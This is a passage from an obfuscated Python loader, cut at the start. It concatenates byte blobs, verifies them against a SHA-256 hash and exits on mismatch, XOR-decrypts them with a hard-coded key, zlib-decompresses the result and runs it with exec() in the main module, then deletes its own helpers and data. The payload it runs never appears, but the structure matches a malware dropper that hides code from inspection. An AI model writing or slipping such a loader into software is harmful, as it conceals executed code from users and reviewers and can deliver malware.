_csjAbOxSVb03go + _cyjzap8ozKg4ys + _cuiW1HXcoC_ChT + _clJlGfFF5cxA8Y + _caebTx9ww0Yi6z + _cjWoNeOdtce5DZ + _cvRMb9LObT1F4x + _cnpRnkIK1ZFuTV + _ctDIp2bBXp2p5Q + _cjpVRfPS3brjSf + _cfX8gthhnK9XeW + _cxF7VWO9YJPPho + _ceQ5EYxZLrz5HX + _cjEU7aBVhM1Bel + _cvVc5fEReUezlJ + _ccuWOYiLDi8qwC + _cr9z0Kvax3X85x + _cx2Ir9ZEG89qX_ + _cv66GmXR2akCXB + _cvGr_juZ6SCK4k + _cuobbDpaFidCQx + _cr1ggzbE06mP3Y + _cckmlACzTRTADy + _cft4Ur1KGGKtDQ + _cypzBlb9fg9DHY + _cd9V5pUNlzGvOq + _cly_N4oX_t1Ss5 + _cpoTyrI029XoTC + _cqpksG6b0UqBFT + _cfDGvo7Meat2Ek + _cg8fJC9y_cVtMt + _creSqZ0AB7QFp5 + _ce6onJRGsDuE_S + _cc8ZfcCT4qZoOR + _cyBU0B2IDHfruI + _cjDPT30JefRJDv + _ckQi1wQMq2G8gf + _cagWJL52AJuk2y + _cysk5bIxMzwtuc + _cwHANJoviI5gfh + _csZY6vr_p0t50y + _ca3979sJ8Rploo + _cmTPHw9J4jZYsa + _cqciR09JmUtR2_ + _cyEdHl0yi4jcM0 + _clBXcaeVCgrXwz + _c_n4BsbbQf01lW + _cnLoB2hksYf6Yk + _cgMmhxRiaCdSJy + _chwR1CIgS9xwzn + _cmZsFpHKahSxT8 + _cgsMHm7R14iFPe + _cmgxlDohfQB5Lb + _clPBbGfnqRiIYt + _cnt36SbWmtUzXk + _cpkOFSSuUjB5WO + _cuenDVKcX1zxBm + _ccwcZn3wxgaOjG + _crmA4MoEnSzcel + _cnchYYIpkvx9Z1 + _cbafL8Do4rYGfU + _cddCzn977v5ZdS + _cpdrxwInedzTLQ + _cjklzolJ0rEPda + _cbPIRMrJMkkVx7 + _caceFBW7kB1mkN + _crER48ZqvHmk9j + _cocwf4NrdnakJk + _cfpJK8KJ07yDRa + _cyQw1eGeBmtAdc + _cuVBM2JjNwiFGa + _cmPYpPgpkxl3Ta + _csEQFYRp5kGw96 + _cz75SjKJCbRPo5 + _co2E0uKaMEJRBk + _cubCsvBWcgyca4 + _cmauZh0ynq03nz + _claNLJ51yTZ3Zh + _cwjQXcOBwlxxaP + _cokIqtQsFpmzFP + _cdCRKtsJY03xpS + _cqGVsCIjOZ5wXB + _cxzeLnv5quZvC6 + _co_0lJOQkyQDvA + _c_7IBoJPgMJg_x + _coksfHGfiqne36)
if __import__('hashlib').sha256(_pqLL5KqMHvqPf9).hexdigest() != 'f53d77eaf902ce064a5213fba67d08791187ee047bd0ec85bedd60fbd1b37a87':
    __import__('sys').exit(1)
_xhuUrgBXrKlikZ = bytes([109, 200, 87, 99, 16, 27, 178, 145, 136, 202])
_fkmhMHDWxpSSXDA = bytes([173, 48, 119, 207, 123, 141, 232, 92, 89, 132])

def _fxuELcr4O9iWRCq(_banK90tZZRXX_D, _kgBJw7445yDNXb):
    return bytes(_banK90tZZRXX_D[_iaekHaCkntlf0K] ^ _kgBJw7445yDNXb[_iaekHaCkntlf0K % len(_kgBJw7445yDNXb)] for _iaekHaCkntlf0K in range(len(_banK90tZZRXX_D)))

def _fdnsV8SYz3kirEs(_tvPPjhehy5Ub8h):
    import zlib
    return zlib.decompress(_tvPPjhehy5Ub8h) # Un seul niveau de zlib ici pour simplifier

def _fe_f0TWMHz45evA():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xpZYYeIOqYD1hJ = _fxuELcr4O9iWRCq(_pqLL5KqMHvqPf9, _xhuUrgBXrKlikZ)
    # 2. Décompression Zlib
    _dbOkx18ZgCR54t = _fdnsV8SYz3kirEs(_xpZYYeIOqYD1hJ)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dbOkx18ZgCR54t.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nhkw4Jl0IzhcCU = _main.__dict__
    _nhkw4Jl0IzhcCU.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nhkw4Jl0IzhcCU)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fe_f0TWMHz45evA()
try:
    del _fxuELcr4O9iWRCq, _fdnsV8SYz3kirEs, _fe_f0TWMHz45evA
    del _pqLL5KqMHvqPf9, _xhuUrgBXrKlikZ, _fkmhMHDWxpSSXDA
except:
    pass
